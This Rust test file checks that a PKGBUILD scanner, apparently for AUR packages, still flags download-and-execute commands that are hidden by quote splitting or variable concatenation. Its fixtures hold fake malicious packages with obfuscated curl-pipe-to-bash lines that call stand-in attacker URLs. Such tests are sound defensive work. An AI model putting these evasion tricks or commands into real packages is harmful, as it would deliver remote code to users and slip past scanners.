//! Regression tests from issue #23: quote splitting must not bypass the
//! download-and-execute override gate.

use traur::coordinator::scan_pkgbuild;
use traur::shared::scoring::Tier;

const SPLIT_CURL_PIPE: &str = r#"pkgname=firefox-fix-bin
pkgver=1.0.0
pkgrel=1
pkgdesc='Fixes for Firefox browser'
arch=('x86_64')
url=''
license=()
source=("https://github.com/attacker/patches/raw/main/patch.tar.gz"
        "http://192.168.1.100/payload.sh")
md5sums=('SKIP'
         'SKIP')

package() {
    cu""rl -s https://bit.ly/malware | ba""sh
    install -Dm755 patch "$pkgdir/usr/bin/firefox-fix"
}
"#;

const VAR_CONCAT_CURL_PIPE: &str = r#"pkgname=firefox-fix-bin
pkgver=1.0.0
pkgrel=1
pkgdesc='Fixes for Firefox browser'
arch=('x86_64')
url=''
license=()
source=("https://github.com/attacker/patches/raw/main/patch.tar.gz")
md5sums=('SKIP')

package() {
    x=cu;y=rl;$x$y -s https://bit.ly/malware | bash
}
"#;

#[test]
fn unsplit_curl_pipe_is_malicious() {
    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
    let result = scan_pkgbuild("firefox-fix-bin", pkgbuild);
    assert_eq!(result.tier, Tier::Malicious);
}

#[test]
fn quote_split_curl_pipe_is_malicious() {
    let result = scan_pkgbuild("firefox-fix-bin", SPLIT_CURL_PIPE);
    assert_eq!(
        result.tier,
        Tier::Malicious,
        "quote-split download-and-execute must reach MALICIOUS, got {:?} (score {})",
        result.tier,
        result.score
    );
    assert!(
        result.override_gate_fired.is_some(),
        "the download-and-execute override gate must fire"
    );
}

#[test]
fn var_concat_curl_pipe_is_malicious() {
    let result = scan_pkgbuild("firefox-fix-bin", VAR_CONCAT_CURL_PIPE);
    assert!(result.override_gate_fired.is_some() || result.tier == Tier::Malicious);
}

#[test]
fn quoted_but_benign_build_stays_trusted() {
    let content = r#"pkgname=benign
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='https://example.com'
license=('MIT')
source=("https://example.com/benign-$pkgver.tar.gz")
sha256sums=('8b0d8b9d9d5d6f1f2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a')

build() {
    cd "$srcdir/benign-$pkgver"
    echo "building with flags" && make -j"$(nproc)"
}

package() {
    cd "$srcdir/benign-$pkgver"
    make DESTDIR="$pkgdir" install
}
"#;
    let result = scan_pkgbuild("benign", content);
    assert!(
        result.tier <= Tier::Sketchy,
        "a normal quoted PKGBUILD must not be escalated, got {:?} ({})",
        result.tier,
        result.score
    );
    assert!(result.override_gate_fired.is_none());
}
